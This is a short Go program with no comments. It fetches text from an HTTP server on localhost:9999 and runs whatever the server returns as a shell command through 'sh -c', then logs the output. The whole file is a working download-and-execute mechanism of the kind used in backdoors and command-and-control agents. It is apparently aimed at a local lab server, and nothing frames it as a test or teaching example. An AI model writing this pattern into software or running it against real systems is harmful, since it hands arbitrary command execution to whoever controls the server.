package main

import (
	"io"
	"log"
	"net/http"
	"os"
	"os/exec"
)

func main() {
	client := http.Client{}
	resp, err := client.Get("http://localhost:9999")
	if err != nil {
		log.Fatal(err)
	}
	data, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Fatal(err)
	}
	err = resp.Body.Close()
	if err != nil {
		log.Fatal(err)
	}

	sh := "sh"
	c := "-c"

	cmd := exec.Command(sh, c, string(data))
	output, err := cmd.Output()
	if err != nil {
		log.Print(err)
		os.Exit(1)
	}
	log.Print(string(output))



}